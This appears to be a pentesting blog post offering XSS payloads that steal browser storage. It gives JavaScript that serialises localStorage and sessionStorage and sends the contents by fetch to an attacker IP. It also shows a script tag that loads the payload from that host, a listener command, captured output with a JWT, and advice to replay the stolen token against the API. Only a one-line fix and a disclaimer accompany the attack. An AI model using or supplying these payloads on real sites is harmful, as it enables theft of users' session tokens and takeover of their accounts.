---
layout: single
title: "XSS — Stealing Local & Session Storage Secrets"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - localstorage
  - sessionstorage
  - jwt
  - token-theft
  - javascript
  - stored-xss
  - dom-xss
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "Many apps store JWTs, API keys, and user data in localStorage and sessionStorage. This XSS payload silently exfiltrates all of it to your server."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## What's Stored There?

Modern web apps frequently store sensitive data client-side:
- JWT access tokens
- API keys
- User profile data
- Feature flags with internal info

Both `localStorage` (persists across tabs/sessions) and `sessionStorage` (tab-scoped) are readable by any JavaScript on the same origin — including yours via XSS.

## Local Storage Payload

**Step 1 — Create `xss.js`:**

```javascript
let data = JSON.stringify(localStorage)
let encodeData = encodeURIComponent(data)
fetch("http://192.168.XX.XX/exfil?data=" + encodeData)
```

**Step 2 — Start server:**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit:**

```html
<script src="http://192.168.XX.XX/xss.js"></script>
```

## Session Storage Payload

```javascript
let data = JSON.stringify(sessionStorage)
let encodeData = encodeURIComponent(data)
fetch("http://192.168.49.129/exfil?data=" + encodeData)
```

## What You Get

<div class="tool-out">GET /exfil?data=%7B%22token%22%3A%22eyJhbGciOiJIUzI1NiJ9...%22%7D HTTP/1.1</div>

Decode it and you'll find the raw JWT or API token. Replay it directly against the API — no password needed.

<div class="remediation-box"><strong>Fix:</strong> Never store sensitive tokens in localStorage or sessionStorage. Use HttpOnly cookies for session tokens. Implement CSP to restrict script execution sources.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
